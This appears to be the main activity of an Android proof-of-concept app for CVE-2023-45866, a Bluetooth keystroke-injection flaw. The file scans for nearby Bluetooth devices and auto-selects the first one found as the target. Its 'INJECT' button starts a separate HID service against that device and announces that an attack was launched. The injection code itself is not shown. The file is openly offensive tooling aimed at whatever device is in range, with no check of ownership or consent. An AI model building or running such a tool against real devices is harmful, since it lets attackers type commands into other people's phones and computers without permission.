package com.hackerai.btkeyboard

import android.Manifest
import android.bluetooth.*
import android.bluetooth.le.*
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import java.util.concurrent.ConcurrentHashMap

class MainActivity : ComponentActivity() {

    private lateinit var bluetoothAdapter: BluetoothAdapter
    private lateinit var leScanner: BluetoothLeScanner
    private val foundDevices = ConcurrentHashMap<String, String>() // address -> name
    private var selectedTarget: String? = null

    private val scanCallback = object : ScanCallback() {
        override fun onScanResult(callbackType: Int, result: ScanResult?) {
            result ?: return
            val device = result.device
            val name = device.name ?: return
            val addr = device.address
            if (name.isNotBlank() && !foundDevices.containsKey(addr)) {
                foundDevices[addr] = name
                runOnUiThread {
                    updateDeviceList()
                }
            }
        }
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { grants ->
        if (grants.values.all { it }) {
            startScanning()
            Toast.makeText(this, "Scanning for targets...", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Bluetooth permissions required", Toast.LENGTH_LONG).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Minimal layout programmatically to avoid resource dependency issues
        val root = android.widget.LinearLayout(this).apply {
            orientation = android.widget.LinearLayout.VERTICAL
            setPadding(32, 32, 32, 32)
        }

        val titleView = TextView(this).apply {
            text = "BT KeyInject — CVE-2023-45866 PoC"
            textSize = 18f
            setPadding(0, 0, 0, 24)
        }
        root.addView(titleView)

        val statusText = TextView(this).apply {
            text = "Status: Ready"
            id = android.R.id.text1
            setPadding(0, 0, 0, 16)
        }
        root.addView(statusText)

        val deviceList = TextView(this).apply {
            text = "Discovered devices will appear here..."
            textSize = 14f
            id = android.R.id.text2
            setPadding(0, 0, 0, 24)
            setTextIsSelectable(true)
        }
        root.addView(deviceList)

        val scanBtn = Button(this).apply {
            text = "🔄 Rescan"
            setOnClickListener { startScanning() }
            isEnabled = false
            id = android.R.id.button1
        }
        root.addView(scanBtn)

        val attackBtn = Button(this).apply {
            text = "⚡ INJECT: Force-Connect Speaker"
            setOnClickListener { launchAttack() }
            isEnabled = false
            id = android.R.id.button2
            setPadding(0, 24, 0, 0)
        }
        root.addView(attackBtn)

        val statusLabel = findViewById<TextView>(android.R.id.text1)
        val attackButton = findViewById<Button>(android.R.id.button2)
        val scanButton = findViewById<Button>(android.R.id.button1)

        // Store refs via tags for later use
        scanBtn.tag = statusText
        attackBtn.tag = deviceList

        setContentView(root)

        // Init Bluetooth
        val btManager = getSystemService(BLUETOOTH_SERVICE) as BluetoothManager
        bluetoothAdapter = btManager.adapter

        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            Toast.makeText(this, "Please enable Bluetooth", Toast.LENGTH_LONG).show()
            return
        }

        leScanner = bluetoothAdapter.bluetoothLeScanner

        // Request permissions
        val perms = if (android.os.Build.VERSION.SDK_INT >= 31) {
            arrayOf(
                Manifest.permission.BLUETOOTH_CONNECT,
                Manifest.permission.BLUETOOTH_SCAN,
                Manifest.permission.BLUETOOTH_ADVERTISE,
                Manifest.permission.POST_NOTIFICATIONS
            )
        } else {
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION)
        }

        if (perms.all { checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED }) {
            startScanning()
        } else {
            permissionLauncher.launch(perms)
        }
    }

    private fun startScanning() {
        try {
            leScanner.stopScan(scanCallback)
        } catch (_: Exception) {}
        foundDevices.clear()

        val scanSettings = ScanSettings.Builder()
            .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
            .setReportDelay(0)
            .build()

        leScanner.startScan(null, scanSettings, scanCallback)
        findViewById<TextView>(android.R.id.text1)?.text = "Status: Scanning..."
    }

    private fun updateDeviceList() {
        val deviceList = findViewById<TextView>(android.R.id.text2)
        val attackBtn = findViewById<Button>(android.R.id.button2)
        val scanBtn = findViewById<Button>(android.R.id.button1)

        val sb = StringBuilder()
        var idx = 0
        for ((addr, name) in foundDevices) {
            sb.appendLine("[$idx] $name [$addr]")
            idx++
        }

        if (idx == 0) {
            sb.append("No devices found yet...")
            attackBtn?.isEnabled = false
        } else {
            attackBtn?.isEnabled = true
        }

        deviceList?.text = sb.toString()
        scanBtn?.isEnabled = true

        // Auto-select first device
        selectedTarget = foundDevices.keys.firstOrNull()
        findViewById<TextView>(android.R.id.text1)?.text =
            "Status: ${foundDevices.size} devices found. Target: ${selectedTarget?.let { foundDevices[it] } ?: "none"}"
    }

    private fun launchAttack() {
        val targetAddr = selectedTarget ?: run {
            Toast.makeText(this, "No target selected", Toast.LENGTH_SHORT).show()
            return
        }

        // Stop scanning before attack
        try { leScanner.stopScan(scanCallback) } catch (_: Exception) {}

        val intent = Intent(this, HidDeviceService::class.java).apply {
            putExtra("target_address", targetAddr)
        }
        ContextCompat.startForegroundService(this, intent)

        findViewById<TextView>(android.R.id.text1)?.text =
            "Status: Attacking ${foundDevices[targetAddr]}..."
        Toast.makeText(this, "Attack launched!", Toast.LENGTH_LONG).show()
    }

    override fun onDestroy() {
        try { leScanner.stopScan(scanCallback) } catch (_: Exception) {}
        super.onDestroy()
    }
}